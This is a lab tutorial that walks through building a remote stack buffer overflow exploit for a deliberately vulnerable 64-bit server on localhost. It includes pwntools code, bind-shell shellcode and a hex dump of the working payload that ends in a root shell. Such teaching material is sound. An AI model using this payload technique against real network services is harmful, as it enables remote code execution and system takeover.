# Development of a remote buffer overflow exploit - 64 bit

## Introduction

We will create a functional exploit for a remote 64bit program with a stack overflow vulnerability - 
a remote server exploit. 


### Source

* Source directory: `~/challenges/challenge13/`
* Source files: [challenge13](https://github.com/dobin/yookiterm-challenges-files/tree/master/challenge13)

You can compile it by calling `make` in the folder `~/challenges/challenge13`


### Vulnerability

The vulnerability lies here:

```
void handleData(char *username, char *password) {
    char name[256];
    ...
    strcpy(name, username);
    ...
}

void handleClient (int socket) {
   char username[1024];
   char password[1024];

   read(socket, username, 1023);
   read(socket, password, 1023);

   int ret = handleData(username, password);
   ...
}
```

The vulnerability is identical to challenge12, but with an increased buffer size (from 128 to 256 bytes)

## Usage

Start the server:
```sh
~/challenges/challenge13$ ./challenge13
Starting server on port: 5001
```

If it cant be started:
```sh
~/challenges/challenge13$ ./challenge13
Starting server on port: 5001
ERROR on binding: Address already in use
```

Do `pkill gdb` and `pkill challenge13`. Maybe you have to wait a few mins
until the socket is freed.

The server expects two messages - similar to challenge12, but this time they
are not read via stdin, but from a TCP/IP socket:

```sh
$ nc localhost 5001
Username: test
Password: test
Not admin.
```


## Writing the exploit

Start our vulnerable server in the background:
```sh
~/challenges/challenge13$ ./challenge13 &
[1] 5312
~/challenges/challenge13$
```


In python, connect to the server we wanna exploit with a pwntools tube:
```python
   io = remote("localhost", 5001)
   gdb.attach(io, '''
set follow-fork-mode child
continue
''')
   io.send(pattern)
```

So instead of using `io = process("./challenge13")`, we connect to it with `io = remote("localhost", 5001)`.

`gdb.attach()` will automagically attach itself to the parent process which listens
on the given port. It is set to follow the spawned children.

The screen will look the same as before: Split into top view with
the script output, and the bottom view with GDB. As we wrote the command `continue` 
in the second argument of `gdb.attach()`, no GDB input prompt will be shown 
if no buffer overflow (crash) occured, as the process exits cleanly, and with it GDB.


## Exploit writing tipp 0

Try sending the data like this:
```
io.sendafter(b"Username: ", pattern)
io.sendafter(b"Password: ", b"password")
io.recvall()
```

`io.recvall()` will basically wait until the process is exited (we ignore what it receives). Without it (or something 
similar like `io.interactive()`), the script would end quickly and takes GDB with it, making
it impossible to use GDB. 

Note that if a shell spawns, the process does not exit immediately! The script will block waiting
for more data, and stuff will not work.


## Exploit writing tipp 1

Use the shellcode in `handleClient():username`. 


## Exploit writing tipp 2

You can set breakpoints in `gdb.attach()` - but be careful, `break *handleClient` will not work,
as it is executed in the parent, and not the child we are debugging. 

```
   gdb.attach(io, '''
set follow-fork-mode child
break *handleClient+1
continue
'''
```


## Exploit writing tipp 3

Use the following shellcode:
```
s = shellcraft.amd64.linux.bindsh(4444, "ipv4")
shellcode = asm(s)
```

And connect to the shell with:
```
ioShell = remote("localhost", 4444)
ioShell.interactive()
```

by *REPLACING* the line:
```
io.recvall()
```


## Example Exploit

Using the correct offset to generate a buffer overflow, it will look like this:
```
~/challenges/challenge13$ python3 challenge13-exploit.py --offset 280
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
[*] running in new terminal: ['/usr/bin/gdb', '-q', '/root/challenges/challenge13/challenge13', '6285', '-x', '/tmp/pwnvvf4je2c.gdb']
[+] Waiting for debugger: Done
--[ Send pattern
00000000  58 58 58 58  41 41 41 41  41 41 41 41  41 41 41 41  │XXXX│AAAA│AAAA│AAAA│
00000010  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000040  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000050  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000060  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000070  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000080  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000090  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000a0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000b0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000c0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000d0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000e0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
000000f0  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000110  41 41 41 41  41 41 41 41  42 42 42 42               │AAAA│AAAA│BBBB│
0000011c
[┘] Receiving all data: 0B

───────────────────────────────────────────────────────────────────────────────────────────────
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x1
$rbx   : 0x0
$rcx   : 0x0
$rdx   : 0x007fffffffe37c  →  0x0000000100000000
$rsp   : 0x007fffffffe380  →  0x00007fff00000001
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x007fffffffe8b0  →  0x0000000000000000
$rdi   : 0x007fffffffe260  →  "XXXXAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$rip   : 0x42424242
────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "challenge13", stopped 0x42424242 in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```

And once it works:
```
~/challenges/challenge13$ python3 challenge13-exploit.py --offset 280 --address 0x7fffffffe790 NOPTRACE
Dont forget to start the server in the background
[+] Opening connection to localhost on port 5001: Done
[!] Skipping debug attach since context.noptrace==True
--[ Send exploit
00000000  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000010  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000020  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000030  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000040  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000050  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000060  90 90 90 90  90 90 90 90  90 90 90 90  90 90 90 90  │····│····│····│····│
00000070  90 90 90 90  90 90 90 90  90 90 6a 29  58 6a 02 5f  │····│····│··j)│Xj·_│
00000080  6a 01 5e 99  0f 05 52 ba  01 01 01 01  81 f2 03 01  │j·^·│··R·│····│····│
00000090  10 5d 52 6a  10 5a 48 89  c5 48 89 c7  6a 31 58 48  │·]Rj│·ZH·│·H··│j1XH│
000000a0  89 e6 0f 05  6a 32 58 48  89 ef 6a 01  5e 0f 05 6a  │····│j2XH│··j·│^··j│
000000b0  2b 58 48 89  ef 31 f6 99  0f 05 48 89  c5 6a 03 5e  │+XH·│·1··│··H·│·j·^│
000000c0  48 ff ce 78  0b 56 6a 21  58 48 89 ef  0f 05 eb ef  │H··x│·Vj!│XH··│····│
000000d0  6a 68 48 b8  2f 62 69 6e  2f 2f 2f 73  50 48 89 e7  │jhH·│/bin│///s│PH··│
000000e0  68 72 69 01  01 81 34 24  01 01 01 01  31 f6 56 6a  │hri·│··4$│····│1·Vj│
000000f0  08 5e 48 01  e6 56 48 89  e6 31 d2 6a  3b 58 0f 05  │·^H·│·VH·│·1·j│;X··│
00000100  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
00000110  41 41 41 41  41 41 41 41  90 e7 ff ff  ff 7f 00 00  │AAAA│AAAA│····│····│
00000120
[+] Opening connection to localhost on port 4444: Done
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
$
```

## Things to think about

* Instead of the listener shellcode, can you use a connect-back shellcode?
